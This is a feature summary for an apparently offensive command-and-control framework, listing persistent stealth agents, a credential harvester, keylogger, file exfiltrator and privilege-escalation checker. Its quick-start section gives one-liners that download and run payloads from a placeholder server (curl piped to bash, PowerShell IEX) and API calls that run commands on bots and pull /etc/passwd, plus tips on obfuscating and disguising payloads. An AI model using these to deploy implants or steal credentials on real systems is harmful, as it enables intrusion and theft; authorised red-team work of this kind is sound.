# Professional Red Team C&C Framework - Summary

## ✅ What's Been Implemented

### Core C&C Server (`src/`)
- ✅ Flask-based REST API server
- ✅ Bot registration and management
- ✅ Remote command execution via SSH
- ✅ File upload/download capabilities
- ✅ Error handling and logging
- ✅ Automatic bot connection management

### Agent Payloads (`payloads/`)

#### 1. Python Agent (`python_agent.py`)
**Features:**
- Cross-platform (Windows, Linux, macOS)
- Works with or without `requests` library (urllib fallback)
- Stealth mode (suppresses output)
- Daemon mode for background execution (Unix)
- Command-line arguments support
- Multiple persistence methods per OS
- Automatic reconnection with exponential backoff
- macOS LaunchAgent support

**Persistence Methods:**
- **Windows:** Registry Run key, VBScript wrapper, Scheduled Task
- **Linux:** systemd service, cron job, .bashrc/.profile, user systemd
- **macOS:** LaunchAgent plist

#### 2. Linux Agent (`linux_agent.sh`)
**Features:**
- Native bash script (no dependencies)
- Automatic daemonization
- Process hiding (hidden copy)
- Multiple persistence methods with fallbacks
- Stealth mode logging
- Automatic retry with backoff
- Environment variable configuration

**Persistence Methods:**
- systemd service (root)
- User systemd service (non-root)
- cron job
- Shell RC files (.bashrc, .profile)

#### 3. Windows Agent (`windows_agent.ps1`)
**Features:**
- Native PowerShell
- Window hiding capability
- Multiple persistence methods
- Comprehensive error handling
- Registry and scheduled task support
- VBScript wrapper for silent execution
- Parameter support

**Persistence Methods:**
- Registry Run key
- VBScript in Startup folder
- Scheduled Task (AtLogon trigger)

### Tools & Documentation

#### 1. Payload Builder (`build_payload.py`)
- Automated payload configuration
- Batch processing (--all flag)
- Generates deployment commands
- Creates configured payloads directory

#### 2. Test Framework (`test_framework.py`)
- Validates all dependencies
- Tests file structure
- Syntax checking for all payloads
- C&C server startup test
- Comprehensive test report

#### 3. Native Windows PowerShell Payloads (NO Python Required)

**Windows Credential Harvester (`windows_credential_harvester.ps1`):**
- Browser passwords (Chrome, Edge, Firefox) - copies databases
- WiFi credentials with SSIDs
- Windows Credential Manager entries
- Registry stored credentials
- SSH keys
- RDP connection history
- PowerShell command history
- Environment variable secrets

**Windows Keylogger (`windows_keylogger.ps1`):**
- Native C# keyboard hook implementation
- Real-time keystroke capture
- Active window title tracking
- Special key handling (Backspace, Enter, etc.)
- Shift/Caps Lock support
- Configurable duration

**Windows Screenshot (`windows_screenshot.ps1`):**
- Native .NET screenshot capture
- Configurable interval and count
- Active window context tracking
- PNG format output
- Session metadata logging

**Windows Network Scanner (`windows_network_scanner.ps1`):**
- Multi-threaded host discovery (50 threads)
- Ping sweep across /24 networks
- Port scanning (configurable ports)
- Hostname resolution
- MAC address retrieval
- Response time measurement

**Windows File Exfiltrator (`windows_file_exfiltrator.ps1`):**
- Pattern-based file search
- Directory structure preservation
- ZIP archive creation
- Content-based keyword search
- Size and count filtering
- Detailed reporting

**Windows Privilege Escalation Checker (`windows_privesc_checker.ps1`):**
- 12+ escalation vector checks:
  - AlwaysInstallElevated registry
  - Unquoted service paths
  - Writable service binaries/registry
  - Scheduled task permissions
  - PATH directory permissions
  - SeImpersonatePrivilege (Potato attacks)
  - Registry passwords
  - Saved credentials
  - Vulnerable software detection
  - Startup folder permissions
  - Weak Program Files permissions

#### 4. Documentation
- **README.md:** Main project documentation with full usage guide
- **RED_TEAM_GUIDE.md:** Comprehensive red team deployment guide (300+ lines)
- **FRAMEWORK_SUMMARY.md:** This file - complete feature summary
- **QUICK_REFERENCE.md:** One-page command reference card
- **PAYLOAD_QUICK_REF.md:** Python-based payload deployment guide
- **WINDOWS_PAYLOADS_GUIDE.md:** Native Windows PowerShell payloads guide
- **ENGAGEMENT_CHECKLIST.md:** Professional engagement workflow checklist
- **payloads/README.md:** Detailed payload documentation

## 🎯 Red Team Ready Features

### Configuration Options
All payloads support:
- Environment variables (CNC_SERVER, SSH_PASSWORD, BOT_ID)
- Command-line arguments
- In-file configuration

### Stealth Features
- Silent execution modes
- Background/daemon operation
- Hidden process names
- No console output in stealth mode
- Innocuous service/task names

### Reliability Features
- Automatic retry logic (3 attempts with backoff)
- Persistent reconnection attempts
- Multiple fallback persistence methods
- Graceful error handling
- No crash on C&C unavailability

### Deployment Methods Supported
1. Direct execution (curl | bash)
2. Web server delivery
3. SSH file transfer
4. Manual placement
5. Encoded/obfuscated delivery

## 🚀 Quick Start Guide

### 1. Verify Setup
```bash
python test_framework.py
```

### 2. Start C&C Server
```bash
python src/cnc_server.py
```

### 3. Configure Payloads
```bash
# Configure all payloads
python build_payload.py --all --server http://YOUR_IP:5000 --password TARGET_SSH_PASS

# Or specific payload
python build_payload.py --payload linux_agent.sh --server http://10.0.0.1:5000 --password MyP@ss
```

### 4. Deploy to Target
```bash
# Linux - Direct
curl http://your-server/configured_payloads/linux_agent.sh | bash

# Windows - Direct
IEX (New-Object Net.WebClient).DownloadString('http://your-server/windows_agent.ps1')

# Python - With options
python python_agent.py --server http://10.0.0.1:5000 --daemon --verbose
```

### 5. Control Bots via API
```bash
# Send command
curl -X POST http://localhost:5000/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-1234", "command": "whoami"}'

# Download file
curl -X POST http://localhost:5000/download_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-1234", "remote_path": "/etc/passwd", "local_path": "./passwd.txt"}'

# Upload file
curl -X POST http://localhost:5000/upload_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-1234", "local_path": "./tool.exe", "remote_path": "C:\\Temp\\tool.exe"}'
```

## 📋 Testing Checklist

Before deployment in a pentest:

- [ ] Test C&C server locally
- [ ] Verify all payloads in lab environment
- [ ] Test persistence mechanisms
- [ ] Verify firewall rules allow C&C communication
- [ ] Test command execution
- [ ] Test file upload/download
- [ ] Verify stealth mode works
- [ ] Test automatic reconnection
- [ ] Document cleanup procedures
- [ ] Get written authorization

## 🔒 Operational Security Tips

1. **Use DNS instead of IP addresses** for C&C server
2. **Obfuscate payloads** before deployment (base64, encoding, etc.)
3. **Rename scripts** to innocuous names (system_update.sh, etc.)
4. **Test in isolated environment** before production use
5. **Use HTTPS** if possible (add SSL to Flask)
6. **Change default ports** from 5000 to less obvious ports
7. **Implement authentication** on C&C API for production
8. **Log all activities** for client reporting
9. **Have cleanup plan** ready before deployment
10. **Stay within scope** of authorization

## 🛠️ Customization Ideas

### For Enhanced Stealth:
- Encrypt C&C communications
- Add jitter to beacon intervals
- Randomize process names
- Domain fronting support
- Sleep/wake commands

### For Better Management:
- Web dashboard for C&C
- Multi-user support
- Bot grouping/tagging
- Command history
- Scheduled commands

### For Advanced Features:
- Credential harvesting
- Screenshot capture
- Keylogging (where authorized)
- Lateral movement helpers
- Privilege escalation checks

## ⚠️ Legal Notice

This framework is designed for **authorized penetration testing only**.

**Required before use:**
- Written authorization from system owner
- Clearly defined scope of engagement
- Rules of engagement documented
- Client understanding of actions taken

**Unauthorized use is illegal and unethical.**

## 📚 Additional Resources

- **Main Documentation:** README.md
- **Red Team Guide:** RED_TEAM_GUIDE.md
- **Payload Details:** payloads/README.md
- **Test Suite:** test_framework.py
- **Payload Builder:** build_payload.py

## 🤝 Support & Contribution

This framework is designed for professional security testers. Use responsibly and ethically.

---

**Remember:** With great power comes great responsibility. Only use on systems you are authorized to test.
